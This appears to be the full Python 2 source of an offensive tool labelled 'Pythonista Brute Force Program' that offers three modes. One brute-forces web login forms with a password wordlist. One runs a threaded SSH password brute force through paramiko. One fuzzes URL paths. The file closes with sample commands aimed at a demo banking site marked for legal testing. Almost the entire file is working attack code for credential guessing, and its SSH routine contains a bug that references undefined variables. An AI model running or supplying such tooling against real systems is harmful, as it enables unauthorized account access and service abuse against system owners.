import time, requests, sys, time, urllib, threading
from datetime import timedelta
import argparse
from paramiko import SSHClient
from paramiko import AutoAddPolicy
parser = argparse.ArgumentParser(description="Pythonista Brute Force Program")

if len(sys.argv) == 1:
	print "To Run Brute Force: -B"
	print "To Run Fuzzer: -F"
	print "To Run SSH Brute Force: -S\n"
if "-B" in sys.argv:
	B = True
else:
	B = False
if "-F" in sys.argv:
	F = True
	B = False
else:
	F = False
if "-S" in sys.argv:
	S = True
	B = False
	F = False
else:
	S = False

try:
	import console
	print "         ___           ___     "
	print "        /\  \         /\  \    "
	sys.stdout.write("       /::\  \  ")
	console.set_color(1,0,0)
	sys.stdout.write("v6")
	console.set_color()
	sys.stdout.write("   /::\  \   \n")
	print "      /:/\:\  \     /:/\:\  \  "
	print "     /::\~\:\  \   /:/  \:\  \ "
	print "    /:/\:\ \:\__\ /:/__/ \:\__\ "
	print "    \/_|::\/:/  / \:\  \ /:/  / "
	print "       |:|::/  /   \:\  /:/  / "
	print "       |:|\/__/     \:\/:/  /  "
	print "       |:|  |        \::/  /   "
	sys.stdout.write("        \|__|  ")
	console.set_color(1,0,0)
	sys.stdout.write("BRUTE")
	console.set_color()
	print "  \/__/    \n"
except:
	print "         ___           ___     "
	print "        /\  \         /\  \    "
	sys.stdout.write("       /::\  \  ")
	console.set_color(1,0,0)
	sys.stdout.write("v6")
	console.set_color()
	sys.stdout.write("   /::\  \   \n")
	print "      /:/\:\  \     /:/\:\  \  "
	print "     /::\~\:\  \   /:/  \:\  \ "
	print "    /:/\:\ \:\__\ /:/__/ \:\__\ "
	print "    \/_|::\/:/  / \:\  \ /:/  / "
	print "       |:|::/  /   \:\  /:/  / "
	print "       |:|\/__/     \:\/:/  /  "
	print "       |:|  |        \::/  /   "
	sys.stdout.write("        \|__|  ")
	sys.stdout.write("BRUTE")
	print "  \/__/    \n"
	pass

if "help" in sys.argv:
	print "\nFuzzer:"
	print "Check README.md for syntax\nSet arg to '-F' run fuzzer.\n"
	print "Brute Force:"
	print "Set arg to '-B' to run brute force.\n"

def brute():
	parser.add_argument("-B", "--BruteForce",action="store_true")
	parser.add_argument("-n", "--nohelp",help="Hides help",action="store_true")
	parser.add_argument("-u", "--url",help="Target site")
	parser.add_argument("-l", "--lookfor",help="Element that appears on successful login")
	parser.add_argument("--uid",help="Username Textbox ID")
	parser.add_argument("--pid",help="Password Textbox ID")
	parser.add_argument("--usr",help="The username being tested")
	parser.add_argument("-p","--pfile",help="Password file")
	args = parser.parse_args()
	time.sleep(2)
	url = args.url
	uid = args.uid
	pid = args.pid
	lkf = args.lookfor
	usr = args.usr
	pwd = args.pfile
	time.sleep(1)
	print "              SavSec\n"
	time.sleep(1)
	leave = False
	if not args.url:
		url = "[Not Selected]"
		leave = True
	if not args.uid:
		uid = "[Not Selected]"
		leave = True
	if not args.pid:
		pid = "[Not Selected]"
		leave = True
	if not args.lookfor:
		lkf = "[Not Selected]"
		leave = True
	if not args.pfile:
		pwd = "[Not Selected]"
		leave = True
	if not args.usr:
		usr = "[Not Selected]"
	if not args.nohelp:
		time.sleep(1)
		print "          Your Arguments\n"
		print "       URL: %s" % url
		print "   USER ID: %s" % uid
		print "   PASS ID: %s" % pid
		print "    SEARCH: %s" % lkf
		print "      USER: %s" % usr
		print "      FILE: %s\n" % pwd
	if leave:
		print ""
		parser.print_usage()
		sys.exit()
	if "http" not in url:
		url = "http://" + url
	f = open(pwd,"r")
	num = sum(1 for line in open(pwd))
	print "       Passwords Loaded:", num
	print " "
	a = 0
	start_time = time.time()
	for i in range(num):
		pwd = f.readline().replace("\n","")
		values = {uid : usr, pid : pwd}
		r = requests.post(url, data=values)
		info = r.content.find(lkf)
		a = a + 1
		sys.stdout.write("\r          Trying %s of %s" %(a,num))
		sys.stdout.flush()
		if info > 2:
			sys.stdout.write("\r            " + pwd + "         \n")
			elapsed_time = time.time() - start_time
			print ""
			time.sleep(3)
			times = str(timedelta(seconds=elapsed_time))
			print "   Time Elapsed:", str(times)
			sys.exit()

def sshbrute(user,pswrd,ip,port,timeout=2):
	sshConnection = SSHClient()
	sshConnection.set_missing_host_key_policy(AutoAddPolicy())
	try:
		sshConnection.connect(ip, port = int(port), username = user, password = pswrd, timeout = int(timeout), allow_agent = False,look_for_keys = False)
		status = True
		print "Auth Successful: %s" % str(username+" "+password)
		sys.exit()
		sshConnection.close()
	except:
		try:
			status = False
		except:
			sys.exit()

def sshb():
	print "       -=- SSH Brute Force -=-\n"
	parser.add_argument("-S", "--SSH",action="store_true")
	parser.add_argument("-n", "--nohelp",help="Hides Help",action="store_true")
	parser.add_argument("-p","--port",default=22,type=int, help="SSH Server Port")
	parser.add_argument("-i", "--ip",help="Target SSH Server")
	parser.add_argument("-P", "--Pswrd",help="Password List")
	parser.add_argument("-u","--user",help="Username")
	parser.add_argument("-t","--timeout",help="Set Timeout",default=2,type=int)
	args = parser.parse_args()
	if not args.ip or not args.port or not args.Pswrd or not args.user:
		parser.print_usage()
		sys.exit()
	f = open(args.Pswrd).readlines()
	dm = []
	for p in f:
		t = threading.Thread(target=sshbrute,args=(args.user,p,args.ip,args.port,args.timeout))
		sys.stdout.write("\r\t [+] Auth: %s %s     " %(str(args.user),str(p)))
		t.daemon = True
		if p not in dm:
			sys.stderr = t.start()
		time.sleep(0.05)
		dm.append(p)

def fuzzer():
	parser.add_argument("-F", "--Fuzzer",action="store_true")
	parser.add_argument("-n", "--nohelp",help="Hides help",action="store_true")
	parser.add_argument("-f", "--fuzz",help="Fuzz Site & Select Fuzz File")
	parser.add_argument("-t", "--target",help="Target Url (* for target)")
	args = parser.parse_args()
	leave = False
	file = args.fuzz
	target = args.target
	if not args.fuzz or not args.target:
		parser.print_usage()
		sys.exit()
	if "http" not in target:
		target = "http://" + target
	print "      -=- Fuzzing Website -=-"
	if "*" not in target:
		print "'*' Symbol Needed To Target Fuzz Location!"
		sys.exit()
	start_time = time.time()
	target = target.replace("*","{0}")
	f = open(file).readlines()
	print "        Options Loaded:", len(f)
	print ""
	for _ in f:
		t = target.format(_)
		n = urllib.urlopen(t).code
		if n != 404:
			print t
	elapsed_time = time.time() - start_time
	times = str(timedelta(seconds=elapsed_time))
	print "   Time Elapsed:", str(times)

if F:
	fuzzer()
if B:
	brute()
if S:
	try:
		sshb()
	except:
		pass

"""Pre-Set Arguments (Legal Testing)"""

# Brute Force Example:
"""
-B -u http://demo.testfire.net/bank/login.aspx --uid uid --pid passw -l Welcome --usr admin -p passes.txt
"""

# Fuzzer Example:
"""
-F -t http://demo.testfire.net/* -f fuzz.data
"""
